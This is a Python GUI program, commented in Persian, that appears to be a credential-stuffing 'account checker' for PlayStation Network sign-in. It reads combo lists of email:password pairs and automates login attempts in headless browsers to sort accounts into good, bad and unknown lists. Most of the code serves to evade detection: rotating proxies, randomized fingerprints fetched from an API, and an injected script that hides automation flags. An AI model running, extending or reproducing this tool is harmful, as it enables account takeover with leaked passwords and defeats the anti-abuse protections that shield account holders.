"""
چکر اکانت با رابط گرافیکی.

نصب:
    pip install playwright
    playwright install chromium
    (در لینوکس) sudo apt install python3-tk

اجرا:
    python "PSN Checker.py"
    (ویندوز) یا دابلکلیک روی start.bat
"""

import json
import os
import queue
import random
import re
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

try:
    import tkinter as tk
    from tkinter import filedialog, messagebox, scrolledtext, ttk
    from playwright.sync_api import sync_playwright
except ImportError as e:
    raise SystemExit(
        f"وابستگی پیدا نشد: {e.name}\n"
        "نصب:\n"
        "  pip install playwright\n"
        "  playwright install chromium\n"
        "  (لینوکس) sudo apt install python3-tk\n"
    ) from e

CONFIG_FILE = Path("config.json")
GOOD_FILE = Path("good.txt")
BAD_FILE = Path("bad.txt")
UNKNOWN_FILE = Path("unknown.txt")

# ---- انتخاب مرورگر ----------------------------------------------------------
# Playwright Chromium بهطور پیشفرض استفاده میشود؛ اگر دانلود آن در دسترس نبود
# (مثلاً محدودیت جغرافیایی)، همان Chrome یا Edge نصبشده روی سیستم اجرا میشود.
# با متغیر محیطی PSN_BROWSER میتوان انتخاب را اجبار کرد: auto | chromium | chrome | edge
BROWSER_ENV = "PSN_BROWSER"

_BROWSER_KW = None


def _system_browsers():
    """مسیر Chrome/Edge نصبشده روی سیستم، به ترتیب اولویت."""
    found = []
    if sys.platform == "win32":
        roots = [os.environ.get(k) for k in
                 ("LOCALAPPDATA", "PROGRAMFILES", "PROGRAMFILES(X86)", "PROGRAMW6432")]
        rels = (r"Google\Chrome\Application\chrome.exe", r"Microsoft\Edge\Application\msedge.exe")
        for root in roots:
            if not root:
                continue
            for rel in rels:
                path = Path(root) / rel
                if path.is_file() and str(path) not in found:
                    found.append(str(path))
    elif sys.platform == "darwin":
        for path in ("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                     "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"):
            if Path(path).is_file():
                found.append(path)
    return found


def _launch_candidates(bundled_ok):
    """گزینههای اجرای مرورگر، به ترتیب امتحان."""
    want = os.environ.get(BROWSER_ENV, "auto").strip().lower()
    system = _system_browsers()
    by_exe = [(f"{Path(p).name} نصبشده", {"executable_path": p}) for p in system]

    if want in ("chrome", "chrome-beta"):
        return [("Google Chrome نصبشده", {"channel": "chrome"})] + by_exe
    if want in ("edge", "msedge"):
        return [("Microsoft Edge نصبشده", {"channel": "msedge"})] + by_exe
    if want == "chromium":
        return [("Chromium پلیورایت", {})] + by_exe
    options = []
    if bundled_ok:
        options.append(("Chromium پلیورایت", {}))
    options.append(("Google Chrome نصبشده", {"channel": "chrome"}))
    options.append(("Microsoft Edge نصبشده", {"channel": "msedge"}))
    return options + by_exe


def launch_browser(p):
    """اجرای یک مرورگر Chromium؛ اولین گزینهای که کار کند به خاطر سپرده میشود."""
    global _BROWSER_KW
    common = dict(headless=True,
                  args=["--disable-blink-features=AutomationControlled", "--no-first-run"],
                  ignore_default_args=["--enable-automation"])
    cached = _BROWSER_KW
    if cached is not None:
        try:
            return p.chromium.launch(**common, **cached)
        except Exception:
            _BROWSER_KW = None      # وضعیت عوض شده؛ دوباره بررسی کن
            cached = None

    try:
        bundled_ok = Path(p.chromium.executable_path).is_file()
    except Exception:
        bundled_ok = False
    errors = []
    for name, kw in _launch_candidates(bundled_ok):
        try:
            browser = p.chromium.launch(**common, **kw)
        except Exception as exc:
            errors.append(f"{name}: {str(exc).splitlines()[0]}")
            continue
        _BROWSER_KW = kw
        return browser
    raise RuntimeError(
        "هیچ مرورگری اجرا نشد. Chromium پلیورایت دانلود نشده و Chrome/Edge هم پیدا نشد.\n"
        "  python -m playwright install chromium\n"
        + "  | ".join(errors[:3])
    )

EMAIL_SEL = ["#signinId", "input[name=signinId]", "input[autocomplete=username]",
             "#email", "input[type=email]", "input[name*=email i]", "input[type=text]"]
PASS_SEL = ["#password", "input[name=password]", "input[type=password]"]
BTN_SEL = ["#signin-button", "button[data-qa=signin-submit]", "button[type=submit]"]
NEXT_SEL = BTN_SEL + ["button:has-text('Next')", "button:has-text('Continue')"]
COOKIE_SEL = ["#onetrust-accept-btn-handler", "button:has-text('Accept All')",
              "button:has-text('Accept')"]

FLOW = r"""
async ([email, pwd]) => {
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const vis = e => e && e.offsetParent !== null;
  const q = l => { for (const s of l) { const e = document.querySelector(s); if (vis(e)) return e; } return null; };
  const body = () => document.body ? document.body.innerText.toLowerCase() : '';
  const clickText = w => { for (const e of document.querySelectorAll('a,button')) {
      const t = (e.innerText || '').toLowerCase();
      if (vis(e) && w.some(x => t.includes(x))) { e.click(); return true; } } return false; };
  const setVal = (el, v) => {
    Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set.call(el, v);
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
  };
  const dob = () => {
    const y = q(['input[name*=year i]','input[id*=year i]']);
    const m = q(['input[name*=month i]','input[id*=month i]']);
    const d = q(['input[name*=day i]','input[id*=day i]']);
    if (y && !y.value) setVal(y,'1990');
    if (m && !m.value) setVal(m,'05');
    if (d && !d.value) setVal(d,'15');
  };

  const VERIFY = ['verification code','enter the code','verify your','verify your email',
                  'verify your mobile','we sent a code','we have sent','verification'];
  const BAD = ["isn't correct",'is not correct','not correct','incorrect','wrong password',
               'passkey','sign in with passkey','try again','invalid'];

  const t0 = Date.now();
  while (Date.now() - t0 < 30000) {
    const b = body();
    if (b.includes('accept all')) clickText(['accept all']);

    const em = q(%EMAIL_SEL%);
    if (em) {
      dob(); em.focus(); setVal(em, email); await sleep(300);
      const btn = q(%NEXT_SEL%);
      if (btn) btn.click(); else clickText(['next','continue','sign in']);
      await sleep(1200);

      const pf = q(%PASS_SEL%);
      if (!pf) { if (q(%EMAIL_SEL%)) { await sleep(800); continue; } }
      if (pf) {
        pf.focus(); setVal(pf, pwd); await sleep(300);
        const sb = q(%BTN_SEL%);
        if (sb) sb.click(); else clickText(['sign in','next','continue']);
      }

      const t1 = Date.now();
      while (Date.now() - t1 < 18000) {
        const u = location.href.toLowerCase();
        const b2 = body();
        if (u.includes('otp') || u.includes('verify')) return 'GOOD';
        for (const m of VERIFY) if (b2.includes(m)) return 'GOOD';
        for (const m of BAD) if (b2.includes(m)) return 'BAD';
        if (q(%PASS_SEL%) && b2.length > 40) return 'BAD';
        await sleep(400);
      }
      return 'UNKNOWN';
    }
    clickText(['create account','sign up','signup','register']);
    await sleep(900);
  }
  return 'UNKNOWN';
}
""".replace("%EMAIL_SEL%", str(EMAIL_SEL)).replace("%PASS_SEL%", str(PASS_SEL)) \
   .replace("%BTN_SEL%", str(BTN_SEL)).replace("%NEXT_SEL%", str(NEXT_SEL))
STEALTH = r"""
(() => {
  const d = DATA;
  try { delete Object.getPrototypeOf(navigator).webdriver; } catch (e) {}
  Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
  if (d.platform) Object.defineProperty(navigator, 'platform', { get: () => d.platform });
  if (d.languages) Object.defineProperty(navigator, 'languages', { get: () => d.languages });
  if (d.cores) Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => d.cores });
  if (!window.chrome) window.chrome = {};
  window.chrome.runtime = { connect() {}, sendMessage() {}, id: undefined };
})();
"""

# ------------------------------------------------------------- پروکسی
def parse_proxy_line(line: str):
    line = line.strip()
    if not line:
        return None
    scheme = "http"
    m = re.match(r"^(https?|socks5|socks4)://", line, re.I)
    if m:
        scheme = m.group(1).lower()
        line = line[m.end():]

    user = pwd = None
    if "@" in line:
        creds, line = line.rsplit("@", 1)
        if ":" in creds:
            user, pwd = creds.split(":", 1)
        else:
            user = creds

    parts = line.split(":")
    if len(parts) >= 4 and user is None:
        host, port, user, pwd = parts[0], parts[1], parts[2], ":".join(parts[3:])
    elif len(parts) >= 2:
        host, port = parts[0], parts[1]
    else:
        return None

    if not port.isdigit():
        return None
    p = {"server": f"{scheme}://{host}:{port}"}
    if user:
        p["username"] = user
        p["password"] = pwd or ""
    return p


def parse_proxies(text: str):
    out = []
    for line in text.splitlines():
        p = parse_proxy_line(line)
        if p:
            out.append(p)
    return out


def mask(p):
    if not p:
        return "بدون پروکسی"
    if p.get("username"):
        return f"{p['server']} | {p['username']}:***"
    return p["server"]


# ------------------------------------------------------------- فینگرپرینت
def random_fingerprint():
    wins = [(1366, 768), (1440, 900), (1536, 864), (1600, 900), (1920, 1080), (1280, 720)]
    vw, vh = random.choice(wins)
    major = random.randint(124, 140)
    return {
        "user_agent": (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       f"(KHTML, like Gecko) Chrome/{major}.0.{random.randint(5000, 7000)}."
                       f"{random.randint(40, 200)} Safari/537.36"),
        "platform": "Win32",
        "languages": ["en-US", "en"],
        "locale": "en-US",
        "timezone": None,
        "viewport": {"width": vw, "height": vh},
        "cores": random.choice([4, 6, 8, 12, 16]),
        "dpr": random.choice([1, 1.25, 1.5]),
    }


def fetch_fingerprint(api_url: str, api_key: str):
    """از API فینگرپرینت می‌گیرد؛ در صورت خطا محلی می‌سازد."""
    if not api_url.strip():
        return random_fingerprint()
    import urllib.request
    try:
        req = urllib.request.Request(api_url.strip(), headers={
            "Accept": "application/json",
            "x-api-key": api_key.strip(),
            "Authorization": f"Bearer {api_key.strip()}",
        })
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read().decode("utf-8", "ignore"))
        if isinstance(data, list) and data:
            data = data[0]
        fp = random_fingerprint()
        ua = data.get("user_agent") or data.get("ua") or data.get("userAgent")
        if ua:
            fp["user_agent"] = ua
        if data.get("platform"):
            fp["platform"] = data["platform"]
        if data.get("locale") or data.get("language"):
            fp["locale"] = data.get("locale") or data.get("language")
            fp["languages"] = [fp["locale"]]
        if data.get("timezone"):
            fp["timezone"] = data["timezone"]
        if data.get("cores") or data.get("hardware_concurrency"):
            fp["cores"] = data.get("cores") or data.get("hardware_concurrency")
        w = data.get("width") or data.get("screen_width")
        h = data.get("height") or data.get("screen_height")
        if w and h:
            fp["viewport"] = {"width": int(w), "height": int(h)}
        return fp
    except Exception:
        return random_fingerprint()


class FingerprintPool:
    def __init__(self):
        self.lock = threading.Lock()
        self.fp = random_fingerprint()
        self.version = 0
        self.counter = 0
        self.every = 0
        self.api_url = ""
        self.api_key = ""

    def configure(self, every, api_url, api_key):
        with self.lock:
            self.every = max(0, every)
            self.api_url = api_url
            self.api_key = api_key

    def current(self):
        with self.lock:
            return self.fp, self.version

    def tick(self):
        """بعد از هر چک صدا زده می‌شود؛ هر N چک، فینگرپرینت را عوض می‌کند."""
        with self.lock:
            if self.every <= 0:
                return None
            self.counter += 1
            if self.counter < self.every:
                return None
            self.counter = 0
            url, key = self.api_url, self.api_key
        fp = fetch_fingerprint(url, key)
        with self.lock:
            self.fp = fp
            self.version += 1
            return fp


# ------------------------------------------------------------- اپ
class App:
    def __init__(self, root):
        self.root = root
        root.title("چکر اکانت")
        root.geometry("820x680")

        self.events = queue.Queue()
        self.stop_flag = threading.Event()
        self.lock = threading.Lock()
        self.running = False
        self.active_workers = 0
        self.pool = FingerprintPool()
        self.proxies = []
        self.queue_items = queue.Queue()

        self.total = 0
        self.done = 0
        self.good = 0
        self.bad = 0
        self.unknown = 0
        self.t0 = 0

        nb = ttk.Notebook(root)
        nb.pack(fill="both", expand=True, padx=8, pady=8)

        self.tab_home = ttk.Frame(nb, padding=12)
        self.tab_set = ttk.Frame(nb, padding=12)
        self.tab_log = ttk.Frame(nb, padding=12)
        nb.add(self.tab_home, text="خانه")
        nb.add(self.tab_set, text="تنظیمات")
        nb.add(self.tab_log, text="گزارش")

        self.build_home()
        self.build_settings()
        self.build_log()

        self.load_config()
        self.root.after(150, self.pump)

    # ---------------- خانه
    def build_home(self):
        f = self.tab_home
        box = ttk.LabelFrame(f, text="کنترل", padding=10)
        box.pack(fill="x")

        self.btn_start = ttk.Button(box, text="شروع", command=self.start)
        self.btn_start.pack(side="left", padx=4)
        self.btn_stop = ttk.Button(box, text="توقف", command=self.stop, state="disabled")
        self.btn_stop.pack(side="left", padx=4)

        self.lbl_status = ttk.Label(box, text="آماده")
        self.lbl_status.pack(side="right", padx=8)

        stat = ttk.LabelFrame(f, text="آمار", padding=10)
        stat.pack(fill="x", pady=10)

        self.vars = {}
        for i, (key, title) in enumerate([("total", "کل"), ("done", "بررسی‌شده"),
                                         ("good", "good"), ("bad", "bad"),
                                         ("unknown", "نامشخص"), ("rate", "در دقیقه"),
                                         ("eta", "زمان باقی‌مانده")]):
            ttk.Label(stat, text=title + ":").grid(row=i // 4, column=(i % 4) * 2, sticky="e", padx=(8, 2), pady=3)
            v = tk.StringVar(value="0")
            self.vars[key] = v
            ttk.Label(stat, textvariable=v, font=("Segoe UI", 10, "bold")).grid(
                row=i // 4, column=(i % 4) * 2 + 1, sticky="w", padx=(0, 14), pady=3)
        files = ttk.LabelFrame(f, text="فایل‌ها", padding=10)
        files.pack(fill="x")
        for i, (name, path) in enumerate([("good.txt", GOOD_FILE), ("bad.txt", BAD_FILE),
                                          ("unknown.txt", UNKNOWN_FILE)]):
            ttk.Button(files, text=f"باز کردن {name}",
                       command=lambda p=path: self.open_file(p)).grid(row=0, column=i, padx=4)

    # ---------------- تنظیمات
    def build_settings(self):
        f = self.tab_set
        r = 0

        ttk.Label(f, text="لینک ورود:").grid(row=r, column=0, sticky="w", pady=6)
        self.ent_url = ttk.Entry(f, width=62)
        self.ent_url.grid(row=r, column=1, sticky="we", pady=6)
        r += 1

        ttk.Label(f, text="پروکسی:").grid(row=r, column=0, sticky="nw", pady=6)
        self.txt_proxy = tk.Text(f, height=4, width=62)
        self.txt_proxy.grid(row=r, column=1, sticky="we", pady=6)
        ttk.Label(f, text="هر خط یک پروکسی. پشتیبانی: host:port | host:port:user:pass | "
                          "user:pass@host:port | http:// | socks5://",
                  foreground="#666", wraplength=520).grid(row=r + 1, column=1, sticky="w")
        r += 2

        ttk.Label(f, text="فایل کمبو:").grid(row=r, column=0, sticky="w", pady=6)
        row = ttk.Frame(f)
        row.grid(row=r, column=1, sticky="we", pady=6)
        self.ent_combo = ttk.Entry(row, width=48)
        self.ent_combo.pack(side="left", fill="x", expand=True)
        ttk.Button(row, text="انتخاب", command=self.pick_combo).pack(side="left", padx=4)
        r += 1

        ttk.Label(f, text="تعداد همزمانی:").grid(row=r, column=0, sticky="w", pady=6)
        self.spn_conc = ttk.Spinbox(f, from_=1, to=20, width=6)
        self.spn_conc.set(3)
        self.spn_conc.grid(row=r, column=1, sticky="w", pady=6)
        r += 1

        ttk.Label(f, text="تغییر فینگرپرینت هر ... چک:").grid(row=r, column=0, sticky="w", pady=6)
        self.spn_fp = ttk.Spinbox(f, from_=0, to=500, width=6)
        self.spn_fp.set(10)
        self.spn_fp.grid(row=r, column=1, sticky="w", pady=6)
        ttk.Label(f, text="۰ = بدون تغییر", foreground="#666").grid(row=r, column=1, sticky="w", padx=(70, 0))
        r += 1

        ttk.Label(f, text="آدرس API فینگرپرینت:").grid(row=r, column=0, sticky="w", pady=6)
        self.ent_fpapi = ttk.Entry(f, width=62)
        self.ent_fpapi.grid(row=r, column=1, sticky="we", pady=6)
        r += 1

        ttk.Label(f, text="کلید API:").grid(row=r, column=0, sticky="w", pady=6)
        self.ent_fpkey = ttk.Entry(f, width=62, show="*")
        self.ent_fpkey.grid(row=r, column=1, sticky="we", pady=6)
        r += 1

        ttk.Button(f, text="ذخیره تنظیمات", command=self.save_config).grid(
            row=r, column=1, sticky="w", pady=14)

        f.columnconfigure(1, weight=1)

    # ---------------- گزارش
    def build_log(self):
        self.txt_log = scrolledtext.ScrolledText(self.tab_log, state="disabled", font=("Consolas", 9))
        self.txt_log.pack(fill="both", expand=True)

    # ---------------- تنظیمات: فایل و ذخیره
    def pick_combo(self):
        p = filedialog.askopenfilename(filetypes=[("متن", "*.txt"), ("همه", "*.*")])
        if p:
            self.ent_combo.delete(0, "end")
            self.ent_combo.insert(0, p)

    def save_config(self):
        cfg = {
            "url": self.ent_url.get().strip(),
            "proxy": self.txt_proxy.get("1.0", "end").strip(),
            "combo": self.ent_combo.get().strip(),
            "conc": self.spn_conc.get(),
            "fp": self.spn_fp.get(),
            "fpapi": self.ent_fpapi.get().strip(),
            "fpkey": self.ent_fpkey.get().strip(),
        }
        CONFIG_FILE.write_text(json.dumps(cfg, ensure_ascii=False, indent=2), encoding="utf-8")
        self.log("تنظیمات ذخیره شد")
    def load_config(self):
        if not CONFIG_FILE.exists():
            return
        try:
            cfg = json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
        except Exception:
            return
        self.ent_url.insert(0, cfg.get("url", ""))
        self.txt_proxy.insert("1.0", cfg.get("proxy", ""))
        self.ent_combo.insert(0, cfg.get("combo", ""))
        self.spn_conc.set(cfg.get("conc", 3))
        self.spn_fp.set(cfg.get("fp", 10))
        self.ent_fpapi.insert(0, cfg.get("fpapi", ""))
        self.ent_fpkey.insert(0, cfg.get("fpkey", ""))

    # ---------------- کمبو
    def load_combo(self, path):
        items, seen = [], set()
        for line in Path(path).read_text(encoding="utf-8", errors="ignore").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = re.split(r"[:|;\t]", line, maxsplit=1)
            email = parts[0].strip()
            pwd = parts[1].strip() if len(parts) > 1 else ""
            if "@" not in email or email.lower() in seen:
                continue
            seen.add(email.lower())
            items.append((email, pwd))
        return items

    # ---------------- کنترل
    def start(self):
        if self.running:
            return
        try:
            fp_every = max(0, int(self.spn_fp.get() or 0))
            conc = max(1, min(20, int(self.spn_conc.get() or 1)))
        except ValueError:
            messagebox.showerror("تنظیمات", "تعداد همزمانی و تغییر فینگرپرینت باید عدد باشند.")
            return
        url = self.ent_url.get().strip()
        combo = self.ent_combo.get().strip()
        if not url or not combo:
            messagebox.showwarning("ناقص", "لینک و فایل کمبو لازم‌اند.")
            return
        if not re.match(r"^https?://", url, re.I):
            url = "https://" + url
        if not Path(combo).exists():
            messagebox.showerror("فایل", "فایل کمبو پیدا نشد.")
            return

        try:
            items = self.load_combo(combo)
        except Exception as e:
            messagebox.showerror("فایل", str(e))
            return
        if not items:
            messagebox.showwarning("خالی", "هیچ ایمیل معتبری در فایل نبود.")
            return

        self.proxies = parse_proxies(self.txt_proxy.get("1.0", "end"))
        self.pool.configure(fp_every, self.ent_fpapi.get(), self.ent_fpkey.get())

        self.total, self.done = len(items), 0
        self.good = self.bad = self.unknown = 0
        self.t0 = time.time()
        self.queue_items = queue.Queue()
        for it in items:
            self.queue_items.put(it)

        self.running = True
        self.stop_flag.clear()
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.lbl_status.configure(text="در حال اجرا")
        self.refresh_stats()
        self.log(f"شروع: {self.total} کمبو | {conc} همزمان")

        with self.lock:
            self.active_workers = conc
        for i in range(conc):
            threading.Thread(target=self.worker, args=(i + 1, url), daemon=True).start()

    def stop(self):
        self.stop_flag.set()
        self.log("درخواست توقف...")

    def worker(self, wid, url):
        try:
            with sync_playwright() as p:
                browser = launch_browser(p)
                ctx = None
                ctx_version = -1
                try:
                    while not self.stop_flag.is_set():
                        try:
                            email, pwd = self.queue_items.get_nowait()
                        except queue.Empty:
                            break

                        fp, ver = self.pool.current()
                        if ctx is None or ver != ctx_version:
                            if ctx:
                                try:
                                    ctx.close()
                                except Exception:
                                    pass
                            ctx = self.make_context(browser, fp)
                            ctx_version = ver
                            res = "UNKNOWN"
                        for _ in range(2):
                            try:
                                page = ctx.new_page()
                                page.set_default_timeout(20000)
                                try:
                                    page.goto(url, wait_until="domcontentloaded", timeout=45000)
                                    res = page.evaluate(FLOW, [email, pwd])
                                finally:
                                    page.close()
                            except Exception:
                                res = "UNKNOWN"
                            if res != "UNKNOWN":
                                break

                        self.record(email, res)
                        if self.pool.tick() is not None:
                            self.log("فینگرپرینت عوض شد")
                finally:
                    if ctx:
                        try:
                            ctx.close()
                        except Exception:
                            pass
                    browser.close()
        except Exception as e:
            self.events.put(("log", f"[{wid}] خطا: {e}"))
        finally:
            with self.lock:
                self.active_workers -= 1
            self.events.put(("thread_done", None))

    def make_context(self, browser, fp):
        proxy = random.choice(self.proxies) if self.proxies else None
        kwargs = dict(
            user_agent=fp["user_agent"],
            proxy=proxy,
            locale=fp.get("locale") or "en-US",
            viewport=fp["viewport"],
            device_scale_factor=fp.get("dpr", 1),
            color_scheme=random.choice(["light", "dark"]),
        )
        if fp.get("timezone"):
            kwargs["timezone_id"] = fp["timezone"]
        ctx = browser.new_context(**kwargs)
        ctx.add_init_script(STEALTH.replace("DATA", json.dumps({
            "platform": fp.get("platform"), "languages": fp.get("languages"),
            "cores": fp.get("cores")})))
        ctx.route("**/*", lambda r: r.abort()
                  if r.request.resource_type in ("image", "font", "media") else r.continue_())
        return ctx

    def record(self, email, res):
        path = {"GOOD": GOOD_FILE, "BAD": BAD_FILE, "UNKNOWN": UNKNOWN_FILE}[res]
        with self.lock:
            with path.open("a", encoding="utf-8") as f:
                f.write(email + "\n")
        self.events.put(("result", (email, res)))

    # ---------------- حلقهٔ رابط
    def pump(self):
        try:
            while True:
                kind, data = self.events.get_nowait()
                if kind == "log":
                    self.log(data)
                elif kind == "result":
                    email, res = data
                    with self.lock:
                        self.done += 1
                        if res == "GOOD":
                            self.good += 1
                        elif res == "BAD":
                            self.bad += 1
                        else:
                            self.unknown += 1
                    self.log(f"{email} -> {res}")
                    self.refresh_stats()
                elif kind == "thread_done":
                    self.threads_done()
        except queue.Empty:
            pass
        self.root.after(150, self.pump)

    def threads_done(self):
        with self.lock:
            active = self.active_workers
        if self.running and self.queue_items.empty() and active == 0:
            self.running = False
            self.btn_start.configure(state="normal")
            self.btn_stop.configure(state="disabled")
            self.lbl_status.configure(text="پایان")
            self.log(f"تمام شد — good: {self.good} | bad: {self.bad} | unknown: {self.unknown}")
    def refresh_stats(self):
        el = max(time.time() - self.t0, 1) if self.t0 else 1
        rate = self.done / el * 60
        left = max(self.total - self.done, 0)
        eta = left / rate if rate > 0 else 0
        self.vars["total"].set(str(self.total))
        self.vars["done"].set(str(self.done))
        self.vars["good"].set(str(self.good))
        self.vars["bad"].set(str(self.bad))
        self.vars["unknown"].set(str(self.unknown))
        self.vars["rate"].set(f"{rate:.1f}")
        self.vars["eta"].set(f"{eta:.1f} دقیقه")

    def log(self, msg):
        self.txt_log.configure(state="normal")
        self.txt_log.insert("end", f"[{datetime.now():%H:%M:%S}] {msg}\n")
        self.txt_log.see("end")
        self.txt_log.configure(state="disabled")

    def open_file(self, path):
        path.touch(exist_ok=True)
        try:
            import os
            import subprocess
            import sys
            if sys.platform == "win32":
                os.startfile(path)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", str(path)])
            else:
                subprocess.Popen(["xdg-open", str(path)])
        except Exception:
            messagebox.showinfo("مسیر", str(path.resolve()))


if __name__ == "__main__":
    root = tk.Tk()
    App(root)
    root.mainloop()
